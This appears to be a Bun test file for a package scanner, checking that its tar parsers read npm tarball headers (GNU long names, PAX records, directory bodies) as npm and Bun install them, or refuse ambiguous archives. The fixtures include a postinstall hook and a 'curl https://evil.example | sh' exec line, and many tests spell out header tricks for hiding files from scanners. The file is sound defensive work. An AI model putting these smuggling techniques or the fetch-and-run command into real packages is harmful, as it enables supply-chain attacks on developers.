// Where npm (node-tar) and Bun (libarchive) read a tar header one way and apm read it another, a file could install under
// a path apm never scanned, or not be scanned at all. Each case here was extracted with npm and with `bun install` and
// lists what both put on disk; readTar and TarStream must read the same files, or refuse the archive.
import { describe, expect, test } from "bun:test";
import { ArchiveError, MAX_META_ENTRY_BYTES, readTar, TarStream, type TarEntry } from "../src/index.ts";

const enc = new TextEncoder();

function header(o: { name: string; size: number; type?: string; magic?: string; prefix?: string }): Uint8Array {
  const h = new Uint8Array(512);
  const put = (s: string, at: number): void => h.set(enc.encode(s), at);
  put(o.name, 0);
  put("0000644\0", 100);
  put("0000000\0", 108);
  put("0000000\0", 116);
  put(`${o.size.toString(8).padStart(11, "0")}\0`, 124);
  put("00000000000\0", 136);
  put("        ", 148);
  put(o.type ?? "0", 156);
  put(o.magic ?? "ustar\x0000", 257);

  if (o.prefix !== undefined) put(o.prefix, 345);
  put(`${h.reduce((n, b) => n + b, 0).toString(8).padStart(6, "0")}\0 `, 148);

  return h;
}

function entry(name: string, body: string, o: { type?: string; magic?: string; prefix?: string } = {}): Uint8Array[] {
  const data = enc.encode(body);

  return [header({ name, size: data.length, ...o }), data, new Uint8Array((512 - (data.length % 512)) % 512)];
}

function rawEntry(name: string, data: Uint8Array, type: string): Uint8Array[] {
  return [header({ name, size: data.length, type }), data, new Uint8Array((512 - (data.length % 512)) % 512)];
}

/** A PAX record of `key=` and these bytes, for a value that is not text. */
function paxBytes(key: string, value: Uint8Array): Uint8Array {
  const rest = value.length + key.length + 3;
  let len = rest + 1;

  while (String(len).length + rest !== len) len = String(len).length + rest;

  return new Uint8Array([...enc.encode(`${len} ${key}=`), ...value, 0x0a]);
}

function paxRecord(kv: string): string {
  let len = kv.length + 3;

  while (`${len} ${kv}\n`.length !== len) len = `${len} ${kv}\n`.length;

  return `${len} ${kv}\n`;
}

const zero = (): Uint8Array => new Uint8Array(512);

function tar(parts: Uint8Array[][]): Uint8Array {
  const all = [...parts.flat(), zero(), zero()];
  const out = new Uint8Array(all.reduce((n, p) => n + p.length, 0));
  let at = 0;

  for (const p of all) {
    out.set(p, at);
    at += p.length;
  }

  return out;
}

const PJ = entry("package/package.json", '{"name":"x","version":"1.0.0","scripts":{"postinstall":"node evil.js"}}');
const EVIL = "require('child_process').exec('curl https://evil.example | sh')";
const LONG = `package/${"d/".repeat(60)}evil.js`;

function streamed(bytes: Uint8Array): TarEntry[] {
  const t = new TarStream(() => "hold");

  // odd chunks, so a header is cut across pushes
  for (let at = 0; at < bytes.length; at += 333) t.push(bytes.subarray(at, at + 333));

  return t.end().files;
}

const pathsOf = (files: readonly TarEntry[]): string[] => files.map((f) => f.path);

describe("tar headers are read as npm and Bun install them", () => {
  const cases: { name: string; bytes: Uint8Array; installed: string[] }[] = [
    { name: "one zero block is passed over; two end the archive", bytes: tar([PJ, [zero()], entry("package/evil.js", EVIL)]), installed: ["package.json", "evil.js"] },
    { name: "a GNU header's prefix bytes are not a path prefix", bytes: tar([PJ, entry("package/evil.js", EVIL, { magic: "ustar  \0", prefix: "zzz" })]), installed: ["package.json", "evil.js"] },
    { name: "a v7 header's prefix bytes are not a path prefix", bytes: tar([PJ, entry("package/evil.js", EVIL, { magic: "", prefix: "zzz" })]), installed: ["package.json", "evil.js"] },
    { name: "a ustar header's prefix is", bytes: tar([PJ, entry("a.js", "x", { prefix: "package/lib" })]), installed: ["package.json", "lib/a.js"] },
    { name: "a GNU long link name leaves the pending long name in place", bytes: tar([PJ, entry("././@LongLink", `${LONG}\0`, { type: "L" }), entry("././@LongLink", "target\0", { type: "K" }), entry("package/short.js", EVIL)]), installed: ["package.json", LONG.slice("package/".length)] },
    { name: "an old-style X PAX header names the next file", bytes: tar([PJ, entry("PaxHeader/a.js", paxRecord("path=package/evil.js"), { type: "X" }), entry("package/a.js", EVIL)]), installed: ["package.json", "evil.js"] },
    { name: "a global PAX header's path names no file", bytes: tar([PJ, entry("pax_global_header", paxRecord("path=package/other.js"), { type: "g" }), entry("package/evil.js", EVIL)]), installed: ["package.json", "evil.js"] },
    // the later of a PAX path and a GNU long name names the file, whichever order they come in: reading the PAX path first
    // listed this evil.js as harmless.txt, a file the scan skips
    { name: "a GNU long name after a PAX path names the file", bytes: tar([PJ, entry("PaxHeader/a", paxRecord("path=package/harmless.txt"), { type: "x" }), entry("././@LongLink", "package/evil.js\0", { type: "L" }), entry("package/evil.js", EVIL)]), installed: ["package.json", "evil.js"] },
    { name: "a GNU long name after an old-style X PAX path names the file", bytes: tar([PJ, entry("PaxHeader/a", paxRecord("path=package/harmless.txt"), { type: "X" }), entry("././@LongLink", "package/evil.js\0", { type: "L" }), entry("package/evil.js", EVIL)]), installed: ["package.json", "evil.js"] },
    { name: "a PAX path after a GNU long name names the file", bytes: tar([PJ, entry("././@LongLink", "package/harmless.txt\0", { type: "L" }), entry("PaxHeader/a", paxRecord("path=package/evil.js"), { type: "x" }), entry("package/harmless.txt", EVIL)]), installed: ["package.json", "evil.js"] },
    { name: "a PAX header that sets no path leaves a GNU long name in place", bytes: tar([PJ, entry("././@LongLink", "package/evil.js\0", { type: "L" }), entry("PaxHeader/a", paxRecord("mtime=1"), { type: "x" }), entry("package/harmless.txt", EVIL)]), installed: ["package.json", "evil.js"] },
  ];

  for (const c of cases) {
    test(c.name, () => {
      expect(pathsOf(readTar(c.bytes))).toEqual(c.installed);
      expect(pathsOf(streamed(c.bytes))).toEqual(c.installed);
    });
  }

  // npm merges a PAX header that sets no path over the one before it, so the earlier path names the file; Bun refuses two
  // PAX headers in a row. Reading the header's own name would list harmless.txt for what npm installs as evil.js
  test("a PAX header that sets no path leaves an earlier PAX path in place", () => {
    const bytes = tar([PJ, entry("PaxHeader/a", paxRecord("path=package/evil.js"), { type: "x" }), entry("PaxHeader/a", paxRecord("mtime=1"), { type: "x" }), entry("package/harmless.txt", EVIL)]);

    expect(pathsOf(readTar(bytes))).toEqual(["package.json", "evil.js"]);
    expect(pathsOf(streamed(bytes))).toEqual(["package.json", "evil.js"]);
  });

  // npm reads an old GNU "N" header's data as the next file's path and Bun passes over it: N(evil.js) then harmless.txt
  // installs evil.js with npm and harmless.txt with Bun, X then N the same, and N then X installs the X path with both.
  // Whatever its order, the archive has no one installed reading, so it is refused
  const N = entry("././@LongLink", "package/evil.js\0", { type: "N" });
  const X = entry("PaxHeader/a", paxRecord("path=package/harmless.txt"), { type: "x" });

  for (const [name, parts] of [
    ["an old GNU long name", [PJ, N, entry("package/harmless.txt", EVIL)]],
    ["a PAX path then an old GNU long name", [PJ, X, N, entry("package/harmless.txt", EVIL)]],
    ["an old GNU long name then a PAX path", [PJ, N, X, entry("package/other.txt", EVIL)]],
  ] as const) {
    test(`${name} is refused`, () => {
      const bytes = tar([...parts]);

      expect(() => readTar(bytes)).toThrow(ArchiveError);
      expect(() => streamed(bytes)).toThrow(ArchiveError);
    });
  }

  // npm and Bun pass over a metadata entry over 1 MiB and an empty long name, installing the next file under its own
  // header name or the pending path (a long name of 2 MB, then evil.js, installs evil.js with both); and npm reads a PAX
  // header line by line, up to a NUL, as text, where Bun reads each record by its length, as bytes (a path holding a
  // newline installs evil.js with npm and harmless\n.txt with Bun). apm refuses them all, which leaves the package
  // unscorable rather than scored clean
  const junk = (n: number): string => "j".repeat(n);
  const over = MAX_META_ENTRY_BYTES + 1;

  const refused: [string, Uint8Array[][]][] = [
    ["a GNU long name over 1 MiB", [PJ, entry("././@LongLink", `package/harmless.txt\0${junk(over)}`, { type: "L" }), entry("package/evil.js", EVIL)]],
    ["a GNU long link name over 1 MiB", [PJ, entry("././@LongLink", `target\0${junk(over)}`, { type: "K" }), entry("package/evil.js", EVIL)]],
    ["a PAX header over 1 MiB", [PJ, entry("PaxHeader/a", paxRecord(`path=package/harmless.txt${"/".repeat(over)}`), { type: "x" }), entry("package/evil.js", EVIL)]],
    ["a global PAX header over 1 MiB", [PJ, entry("pax_global_header", paxRecord(`comment=${junk(over)}`), { type: "g" }), entry("package/evil.js", EVIL)]],
    ["an empty GNU long name", [PJ, entry("././@LongLink", "", { type: "L" }), entry("package/evil.js", EVIL)]],
    ["an empty GNU long name after a PAX path", [PJ, entry("PaxHeader/a", paxRecord("path=package/evil.js"), { type: "x" }), entry("././@LongLink", "", { type: "L" }), entry("package/harmless.txt", EVIL)]],
    ["an empty GNU long link name", [PJ, entry("././@LongLink", "", { type: "K" }), entry("package/evil.js", EVIL)]],
    ["a PAX path holding a newline", [PJ, entry("PaxHeader/a", paxRecord("path=package/harmless\n.txt"), { type: "x" }), entry("package/evil.js", EVIL)]],
    ["a PAX record whose newline npm reads as a path record", [PJ, entry("PaxHeader/a", paxRecord(`comment=a\n${paxRecord("path=package/evil.js").slice(0, -1)}`), { type: "x" }), entry("package/harmless.txt", EVIL)]],
    ["a PAX path holding a NUL", [PJ, entry("PaxHeader/a", paxRecord("path=package/evil.js\0.txt"), { type: "x" }), entry("package/evil.js", EVIL)]],
    ["a PAX path that is not UTF-8", [PJ, rawEntry("PaxHeader/a", paxBytes("path", new Uint8Array([...enc.encode("package/a"), 0xff, ...enc.encode(".txt")])), "x"), entry("package/evil.js", EVIL)]],
    ["a PAX record that is not UTF-8", [PJ, rawEntry("PaxHeader/a", paxBytes("comment", new Uint8Array([0xc3, 0x28])), "x"), entry("package/evil.js", EVIL)]],
  ];

  for (const [name, parts] of refused) {
    test(`${name} is refused`, () => {
      const bytes = tar(parts);

      expect(() => readTar(bytes)).toThrow(ArchiveError);
      expect(() => streamed(bytes)).toThrow(ArchiveError);
    });
  }

  // npm and Bun read a directory as having no body whatever its size field says, so a header in its "body" is the next
  // entry: each of these installs evil.js with both. A PAX header with records after a NUL installs evil.js with npm,
  // which reads on past the NUL line, and a.js with Bun
  const hidden = new Uint8Array(entry("package/evil.js", EVIL).flatMap((part) => [...part]));
  const afterNul = new Uint8Array([...enc.encode(paxRecord("path=package/readme.md")), 0, 0x0a, ...enc.encode(paxRecord("path=package/evil.js"))]);
  const a = entry("package/a.js", "ok");

  const hiding: [string, Uint8Array[][]][] = [
    ["a directory with a body", [PJ, rawEntry("package/lib/", hidden, "5"), a]],
    ["a directory with a body and no trailing slash", [PJ, rawEntry("package/lib", hidden, "5"), a]],
    ["a file entry whose name ends in a slash, with a body", [PJ, rawEntry("package/lib/", hidden, "0"), a]],
    ["an old-style file entry whose name ends in a slash, with a body", [PJ, rawEntry("package/lib/", hidden, "\0"), a]],
    ["a file entry whose PAX path ends in a slash, with a body", [PJ, entry("PaxHeader/a", paxRecord("path=package/lib/"), { type: "x" }), rawEntry("package/lib", hidden, "0"), a]],
    ["a file entry whose GNU long name ends in a slash, with a body", [PJ, entry("././@LongLink", "package/lib/\0", { type: "L" }), rawEntry("package/lib", hidden, "0"), a]],
    ["a PAX header with a record after a NUL", [PJ, rawEntry("PaxHeader/a", afterNul, "x"), entry("package/a.js", EVIL)]],
    ["a global PAX header with a record after a NUL", [PJ, rawEntry("pax_global_header", afterNul, "g"), entry("package/a.js", EVIL)]],
  ];

  for (const [name, parts] of hiding) {
    test(`${name} is refused`, () => {
      const bytes = tar(parts);

      expect(() => readTar(bytes)).toThrow(ArchiveError);
      expect(() => streamed(bytes)).toThrow(ArchiveError);
    });
  }

  test("an empty directory, as npm packs one, is read with the files after it", () => {
    const bytes = tar([PJ, rawEntry("package/lib/", new Uint8Array(0), "5"), entry("package/lib/a.js", "ok")]);

    expect(pathsOf(readTar(bytes))).toEqual(["package.json", "lib/a.js"]);
    expect(pathsOf(streamed(bytes))).toEqual(["package.json", "lib/a.js"]);
  });

  test("a PAX header padded with NULs after its last record is read", () => {
    const bytes = tar([PJ, rawEntry("PaxHeader/a", new Uint8Array([...enc.encode(paxRecord("path=package/evil.js")), 0, 0, 0]), "x"), entry("package/a.js", EVIL)]);

    expect(pathsOf(readTar(bytes))).toEqual(["package.json", "evil.js"]);
    expect(pathsOf(streamed(bytes))).toEqual(["package.json", "evil.js"]);
  });

  test("a GNU long name of exactly 1 MiB names the next file, as npm reads it", () => {
    const name = "package/evil.js\0";
    const bytes = tar([PJ, entry("././@LongLink", name + junk(MAX_META_ENTRY_BYTES - name.length), { type: "L" }), entry("package/harmless.txt", EVIL)]);

    expect(pathsOf(readTar(bytes))).toEqual(["package.json", "evil.js"]);
    expect(pathsOf(streamed(bytes))).toEqual(["package.json", "evil.js"]);
  });

  test("a PAX path with multi-byte UTF-8 is read", () => {
    const bytes = tar([PJ, rawEntry("PaxHeader/a", paxBytes("path", enc.encode("package/café.js")), "x"), entry("package/a.js", EVIL)]);

    expect(pathsOf(readTar(bytes))).toEqual(["package.json", "café.js"]);
    expect(pathsOf(streamed(bytes))).toEqual(["package.json", "café.js"]);
  });

  test("the file after a lone zero block is read whole", () => {
    const [, evil] = readTar(tar([PJ, [zero()], entry("package/evil.js", EVIL)]));

    expect(new TextDecoder().decode(evil?.data)).toBe(EVIL);
  });

  // npm gives the next entry the PAX size, so the header's size would read every later entry at other bytes: here npm
  // installs a.js as 1024 bytes holding b.js's header, where the header's size reads a.js empty and b.js apart. Bun
  // agrees with npm for an "x" header and not for a "g" one, so neither reading is the installed one: refused
  for (const type of ["x", "g"]) {
    test(`a ${type} PAX header that sets a size is refused`, () => {
      const bytes = tar([PJ, entry("PaxHeader/a.js", paxRecord("size=1024"), { type }), entry("package/a.js", ""), entry("package/b.js", "b")]);

      expect(() => readTar(bytes)).toThrow(ArchiveError);
      expect(() => streamed(bytes)).toThrow(ArchiveError);
    });
  }
});
